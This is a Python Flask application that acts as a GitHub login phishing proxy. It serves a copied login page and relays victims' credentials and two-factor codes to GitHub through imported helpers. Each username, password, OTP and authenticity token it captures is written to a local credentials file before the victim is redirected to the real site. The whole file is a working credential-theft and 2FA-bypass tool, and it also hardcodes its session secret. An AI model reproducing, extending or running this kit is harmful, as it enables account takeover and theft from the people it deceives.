from flask import Flask, request, render_template, redirect, url_for,  session as flask_session
from scripts.login import get_login_page, perform_login, perform_2fa, execute_2fa

app = Flask(__name__)

app.secret_key = "c69f1b2de2680d2a29ac95ec8d5b83ab"


@app.route("/", methods=["GET"])
def home():
    html_content = get_login_page()
    return render_template("index.html", github_login=html_content)

@app.route("/session", methods=["POST"])
def session():
    username = request.form.get("login")
    password = request.form.get("password")

    response_html, success = perform_login(username, password)


    flask_session["username"] = username
    flask_session["password"] = password

    if success == "success":
        with open("credentials/credentials.txt", "w") as f:
            f.write("Username: " + flask_session.get("username") + " Password: " + flask_session.get("password") + " Authentication Cookie: " + flask_session.get("authenticity_token") + "\n")
        return redirect("https://github.com/")
    
    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    return render_template("response.html")

@app.route("/sessions/two-factor/app", methods=["GET"])
def two_fa():

    response_html = perform_2fa()

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    return render_template("response.html")

@app.route("/sessions/two-factor", methods=["POST"])
def post_two_fa():
    app_otp = request.form.get("app_otp")
    if not app_otp:
        return "Missing OTP", 400
    response_html, status = execute_2fa(app_otp)

    if status == "success":
        with open("credentials/credentials.txt", "w") as f:
            f.write("Username: " + flask_session.get("username") + " Password: " + flask_session.get("password") + " OTP: " + app_otp + " Authentication Cookie: " + flask_session.get("authenticity_token") + "\n")
        return redirect("https://github.com/")

    with open("templates/response.html", "w", encoding="utf-8") as f:
        f.write(response_html)

    return render_template("response.html")

if __name__ == "__main__":
    app.run(debug=True)
